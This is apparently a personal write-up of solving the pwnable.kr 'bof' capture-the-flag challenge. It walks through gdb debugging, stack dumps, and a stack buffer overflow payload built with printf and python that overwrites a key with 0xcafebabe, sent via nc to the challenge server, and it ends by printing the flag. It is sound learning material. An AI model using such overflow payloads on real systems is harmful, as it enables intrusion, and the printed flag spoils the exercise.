- OK so I got the binary, not compiling yet with symbols - I tried it but there is a chance that my gcc is handling my bof (not sure if it's true but I could'nt make it work)
- Debugging the original binary with no symbols.
- I managed to find the location of the "key arg"
- How? I saw the cmp with 0xcafebabe:
=> 0x56555654 <+40>:	cmp    DWORD PTR [ebp+0x8],0xcafebabe
- Finding the pointer - p/x $ebp+0x8
$4 = 0xffffd180
- Getting the data - p/x *0xffffd180
$5 = 0xdeadbeef
- Cool. Now let's see if I can change that data.
- Nice! I put aaaaaaaaaa.... and got the following:
p/x *0xffffd180
$6 = 0x61616161
- Now let's building a payload..
- Using "b *0x56555654" to break point on the cmp line.
- I saw that I need 52 bytes of padding before the payload.
- I used the "good old" print "%b" to create the following payload:
printf "%b" '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xbe\xba\xfe\xca' > data.bin

- I had a bit of truble "feeding" it in the binary, I used this in the end:
- After running gdb ./bof, I can use "run ./bof < data.bin"

- The code actualy passes the check, but still crashes. Let's see if I can build a better payload.

- Using "x/40x $sp" I can see the 40 words from the stack pointer:
0xffffd130:	0xffffd14c	0x0000002c	0x00000000	0x00000000
0xffffd140:	0x00000000	0x00000000	0x00000000	0x61616161
0xffffd150:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd160:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd170:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd180:	0xcafebabe	0x00000000	0xf7f9aff4	0xf7e951a7
0xffffd190:	0xffffd3f2	0x00000070	0xf7ffd020	0xf7d9b3b5
0xffffd1a0:	0x00000002	0xffffd254	0xffffd260	0xffffd1c0
0xffffd1b0:	0xf7f9aff4	0x5655568a	0x00000002	0xffffd254
0xffffd1c0:	0xf7f9aff4	0xffffd254	0xf7ffcb80	0xf7ffd020

- As we can, I corrupted plenty of the stack. Let's see what I can do about it.

This is the stack in the wild
0xffffd130:	0xffffd14c	0x0000002c	0x00000000	0x00000000
0xffffd140:	0x00000000	0x00000000	0x00000000	0x61616161
0xffffd150:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd160:	0x61616161	0x61616161	0x61616161	0xeb2b1000
0xffffd170:	0xffffd1b0	0xf7fc166c	0xffffd198	0x5655569f
0xffffd180:	0xdeadbeef	0x00000000	0xf7f9aff4	0xf7e951a7
0xffffd190:	0xffffd3f6	0x00000070	0xf7ffd020	0xf7d9b3b5
0xffffd1a0:	0x00000001	0xffffd254	0xffffd25c	0xffffd1c0
0xffffd1b0:	0xf7f9aff4	0x5655568a	0x00000001	0xffffd254
0xffffd1c0:	0xf7f9aff4	0xffffd254	0xf7ffcb80	0xf7ffd020


printf "%b" '\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x00\x10\x2b\xeb\xb0\xd1\xff\xff\x6c\x16\xfc\xf7\x98\xd1\xff\xff\x9f\x56\x55\x56\xbe\xba\xfe\xca' > data.bin

- I managed to get this:
0xffffd130:	0xffffd14c	0x0000002c	0x00000000	0x00000000
0xffffd140:	0x00000000	0x00000000	0x00000000	0x61616161
0xffffd150:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffd160:	0x61616161	0x61616161	0x61616161	0xeb2b1000
0xffffd170:	0xffffd1b0	0xf7fc166c	0xffffd198	0x5655569f
0xffffd180:	0xcafebabe	0x00000000	0xf7f9aff4	0xf7e951a7
0xffffd190:	0xffffd3f0	0x00000070	0xf7ffd020	0xf7d9b3b5
0xffffd1a0:	0x00000002	0xffffd254	0xffffd260	0xffffd1c0
0xffffd1b0:	0xf7f9aff4	0x5655568a	0x00000002	0xffffd254
0xffffd1c0:	0xf7f9aff4	0xffffd254	0xf7ffcb80	0xf7ffd020

- I think there is a stack canery :(
This is the error I get: *** stack smashing detected ***: terminated
There is a value that changes every time, and I think this is the canery. HOW CAN I WORK AROUND IT?

- OK. I figured there is no way that I need to handle a stack canery in this stage of pwnable. Because I already managed to pass the check, and I could'nt debug the remote server - I was ok with looking into the writeup, seeing what is the deal there.

- I managed to do EVERYTHING right. YOU WON'T BELIVE IT. the only thing he did differently is the payload creation. He did it with python like this:
python -c "print 'A' * 52 + '\xbe\xba\xfe\xca'" > ./payload 
- Using xxd I found that the ONLY diffrence between our payload is a single byte in the end: "0a"
- Looked into it, seems like it's a terminater :(
- Adding it to my printf command I ran the payload again:
"bof (cat data.bin && cat) | nc pwnable.kr 9000"
and then "cat flag" and I won!
- I sadly had to look up the 0a thing, but it was a "fistun" that I couldn't debug.
FLAG: daddy, I just pwned a buFFer :)